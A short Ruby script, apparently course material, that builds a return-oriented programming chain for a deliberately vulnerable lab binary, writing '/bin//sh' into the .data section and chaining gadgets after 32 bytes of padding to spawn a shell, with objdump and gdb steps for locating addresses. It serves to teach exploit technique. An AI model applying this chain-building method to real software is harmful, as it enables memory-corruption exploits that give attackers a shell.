#! /usr/bin/ruby

# Simple ROP chain builder.
# Elias Athanasopoulos  <athanasopoulos.elias@ucy.ac.cy>
# February, 2023
#
# How to run the script:
# % ./rop `printf "\`ruby ./build-rop-chain.rb\`"`
#
# How to filter the gadgets:
# % objdump -d ./rop | grep \<f\[0-9\]
# 08049186 <f1>:
# 0804918f <f2>:
# 08049198 <f3>:
# 080491a1 <f4>:
# 080491aa <f5>:
# 080491b3 <f6>:
# 080491bc <f7>:
# 080491c5 <f8>:

g1 = 0x08049186 + 0x3
g2 = 0x0804918f + 0x3
g3 = 0x08049198 + 0x3
g4 = 0x080491a1 + 0x3
g5 = 0x080491aa + 0x3
g6 = 0x080491b3 + 0x3
g7 = 0x080491bc + 0x3
g8 = 0x080491c5 + 0x3

# How to find .data:
#
# gdb ./rop
# (gdb) info files
#       ...  
#       0x0804c014 - 0x0804c01c is .data
#       ...

data = 0x0804c018

def fxaddr(g) 
	address = "%08x" % g
	b1 = address[0..1]
	b2 = address[2..3]
	b3 = address[4..5]
	b4 = address[6..7]
	"\\x#{b4}\\x#{b3}\\x#{b2}\\x#{b1}"
end

rop_chain = fxaddr(g1) + fxaddr(0x6e69622f) + fxaddr(data) + fxaddr(g3)
rop_chain += fxaddr(g1) + fxaddr(0x68732f2f) + fxaddr(data+4) + fxaddr(g3)
rop_chain += fxaddr(g1) + fxaddr(data) + fxaddr(data)
rop_chain += fxaddr(g4) + fxaddr(g2) + fxaddr(g5) + fxaddr(g6) + fxaddr(g7) + fxaddr(g8)

puts "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + rop_chain 
